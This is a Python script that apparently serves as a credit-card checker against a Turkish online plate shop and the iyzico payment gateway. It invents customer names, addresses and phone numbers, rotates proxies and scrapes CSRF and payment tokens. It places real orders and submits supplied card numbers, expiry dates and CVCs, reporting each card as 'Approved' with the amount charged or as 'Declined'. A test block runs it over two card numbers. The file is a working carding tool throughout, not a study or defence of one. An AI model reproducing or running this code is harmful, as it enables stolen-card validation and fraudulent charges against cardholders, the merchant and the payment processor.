import os
import re
import json
import time
import random
from typing import Tuple, Dict, Any
import requests
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

FIRST_NAMES = (
    "Ahmet", "Mehmet", "Mustafa", "Ali", "Huseyin", "Hasan", "Ibrahim", "Ismail", "Osman", "Yusuf",
    "Omer", "Emre", "Murat", "Burak", "Serkan", "Hakan", "Oguz", "Tolga", "Can", "Kaan",
    "Fatma", "Ayse", "Emine", "Hatice", "Zeynep", "Elif", "Merve", "Busra", "Esra", "Seda",
    "Derya", "Ebru", "Gamze", "Selin", "Gizem", "Deniz", "Ece", "Ceren", "Ezgi", "Melis",
    "Batuhan", "Berkay", "Baris", "Arda", "Eren", "Furkan", "Onur", "Gokhan", "Alper", "Volkan"
)

LAST_NAMES = (
    "Yilmaz", "Kaya", "Demir", "Celik", "Sahin", "Yildiz", "Yildirim", "Ozturk", "Aydin", "Ozdemir",
    "Arslan", "Dogan", "Kilic", "Aslan", "Cetin", "Kara", "Koc", "Kurt", "Ozkan", "Simsek",
    "Polat", "Ozcan", "Korkmaz", "Cakir", "Erdogan", "Yavuz", "Gunes", "Acar", "Guler", "Avci"
)

EMAIL_DOMAINS = ("gmail.com", "hotmail.com", "outlook.com", "yandex.com")

CITIES_AND_DISTRICTS = (
    ("İstanbul", ("Kadıköy", "Beşiktaş", "Üsküdar", "Şişli", "Bakırköy", "Maltepe")),
    ("Ankara", ("Çankaya", "Keçiören", "Yenimahalle", "Mamak", "Etimesgut")),
    ("İzmir", ("Konak", "Karşıyaka", "Bornova", "Buca", "Bayraklı")),
    ("Bursa", ("Nilüfer", "Osmangazi", "Yıldırım")),
    ("Antalya", ("Muratpaşa", "Kepez", "Konyaaltı")),
    ("Adana", ("Seyhan", "Çukurova")),
    ("Gaziantep", ("Şahinbey", "Şehitkamil")),
    ("Amasya", ("Merkez", "Merzifon", "Suluova"))
)

STREETS = (
    "Atatürk Caddesi", "Cumhuriyet Caddesi", "İnönü Caddesi", "İstiklal Caddesi",
    "Gazi Bulvarı", "Bağdat Caddesi", "Fevzi Çakmak Sokak", "Barış Sokak", "Çınar Sokak"
)

PHONE_PREFIXES = ("530", "532", "533", "535", "542", "544", "552", "554")
PLATE_TEXTS = ("XYZBEST", "TURBO34", "SPEED06", "FAST35", "VIP55", "KING01")

RE_CSRF = re.compile(r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']')
RE_IYZI_TOKEN = re.compile(r'token\s*:\s*["\']([a-zA-Z0-9\-]{25,})["\']')
RE_PRICE = re.compile(r'price\s*:\s*([0-9\.]+)')
TR_MAP = str.maketrans("çğıöşüÇĞİÖŞÜ", "cgiosuCGIOSU")

PROXIES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data", "proxies.txt")

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        try:
            with open(PROXIES_FILE, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
        except Exception:
            pass
    return []

def get_next_proxy():
    plist = load_proxies()
    if plist:
        return random.choice(plist)
    return None

def generate_customer():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    clean_first = first.translate(TR_MAP).lower()
    clean_last = last.translate(TR_MAP).lower()
    
    email = f"{clean_first}.{clean_last}{random.randint(100, 9999)}@{random.choice(EMAIL_DOMAINS)}"
    phone = f"{random.choice(PHONE_PREFIXES)}{random.randint(1000000, 9999999)}"
    
    city, districts = random.choice(CITIES_AND_DISTRICTS)
    district = random.choice(districts)
    street = random.choice(STREETS)
    address = f"{street} No:{random.randint(1, 120)} D:{random.randint(1, 15)} {district}/{city}"
    
    return {
        "full_name": f"{first} {last}",
        "card_holder": f"{clean_first.upper()} {clean_last.upper()}",
        "email": email,
        "phone": phone,
        "city": city,
        "district": district,
        "address": address
    }

def create_fast_session():
    s = requests.Session()
    adapter = HTTPAdapter(
        pool_connections=10,
        pool_maxsize=10,
        max_retries=Retry(total=1, backoff_factor=0.1)
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept-Language': 'tr-TR,tr;q=0.9',
        'Connection': 'keep-alive',
    })
    proxy = get_next_proxy()
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    return s

def query_iyzico_charge(cn: str, em: str, ey: str, cv: str) -> str:
    """
    Bot standartlarina uygun iyzico gateway query fonksiyonu.
    Girdi: cn (Kart No), em (Ay), ey (Yil), cv (CVC)
    Cikti: 'Approved! - ...' veya 'Declined! - ...' veya '⚠️ ...'
    """
    try:
        cn = re.sub(r'\D', '', str(cn))
        em = str(em).zfill(2)
        ey = str(ey)
        if len(ey) == 4:
            ey = ey[2:]
        cv = str(cv).strip()

        session = create_fast_session()

                                                    
        r_prod = session.get('https://plakalikmerkezi.com/urun/motor-plaka', timeout=12)
        if r_prod.status_code != 200:
            return "⚠️ Site Hatası (Ürün Sayfası Açılamadı)"

        match_token = RE_CSRF.search(r_prod.text)
        if not match_token:
            return "⚠️ Site Hatası (CSRF Token Alınamadı)"
        csrf_token = match_token.group(1)

                              
        add_payload = {
            '_token': csrf_token,
            'inscription': random.choice(PLATE_TEXTS),
            'plate_quantity': 'Tek Plaka',
            'frame_color': 'Siyah Kordonlu',
            'customer_note': '',
            'quantity': '1'
        }
        session.post(
            'https://plakalikmerkezi.com/sepet/ekle/motor-plaka',
            data=add_payload,
            headers={'Referer': 'https://plakalikmerkezi.com/urun/motor-plaka'},
            allow_redirects=False,
            timeout=12
        )

                                         
        customer = generate_customer()
        order_payload = {
            '_token': csrf_token,
            'customer_name': customer['full_name'],
            'customer_email': customer['email'],
            'customer_phone': customer['phone'],
            'shipping_city': customer['city'],
            'shipping_district': customer['district'],
            'shipping_address': customer['address'],
            'payment_method': 'iyzico',
            'notes': '',
            'agree': 'on'
        }

        r_order = session.post(
            'https://plakalikmerkezi.com/odeme',
            data=order_payload,
            headers={'Referer': 'https://plakalikmerkezi.com/odeme'},
            timeout=15
        )

                                                
        token_match = RE_IYZI_TOKEN.search(r_order.text)
        if not token_match:
            return "⚠️ Site Hatası (Ödeme Tokeni Alınamadı)"
        iyzi_token = token_match.group(1)

        price_match = RE_PRICE.search(r_order.text)
        paid_price = float(price_match.group(1)) if price_match else 750.0

                                               
        iyzi_payload = {
            "installment": 1,
            "paidPrice": paid_price,
            "paymentChannel": "MOBILE_ANDROID",
            "paymentCard": {
                "cardNumber": cn,
                "cardHolderName": customer["card_holder"],
                "expireYear": ey,
                "expireMonth": em,
                "cvc": cv,
                "registerConsumerCard": False,
                "registerCard": 0
            },
            "pwiMetadata": {
                "lightRedesign": ["False"],
                "pwiGrowthActionDisabled": ["False"]
            }
        }

        iyzi_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-IYZI-TOKEN': iyzi_token,
            'Origin': 'https://plakalikmerkezi.com',
            'Referer': r_order.url,
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty'
        }

        r_auth = session.post(
            'https://api.iyzipay.com/payment/iyzipos/checkoutform/auth/ecom',
            json=iyzi_payload,
            headers=iyzi_headers,
            timeout=15
        )

        try:
            res_json = r_auth.json()
        except Exception:
            return "⚠️ iyzico Yanıt Hatası (JSON Ayrıştırılamadı)"

        status = res_json.get("status")
        if status == "success":
            return f"Approved! - {paid_price:.2f} TRY Charged!"
        else:
            err_msg = res_json.get("errorMessage") or res_json.get("errorGroup") or "Declined"
            err_code = res_json.get("errorCode", "")
            code_str = f" ({err_code})" if err_code else ""
            return f"Declined! - {err_msg}{code_str}"

    except requests.exceptions.Timeout:
        return "⚠️ Site Hatası (Zaman Aşımı)"
    except requests.exceptions.ProxyError:
        return "⚠️ Proxy Hatası"
    except Exception as exc:
        return f"⚠️ Hata: {str(exc)[:60]}"

if __name__ == '__main__':
    test_cards = [
        ("4938410199641622", "06", "29", "899"),
        ("5528790000000001", "12", "26", "123")
    ]
    for c in test_cards:
        t0 = time.time()
        res = query_iyzico_charge(*c)
        print(f"Card: {c[0]} -> {res} ({round(time.time() - t0, 2)}s)")
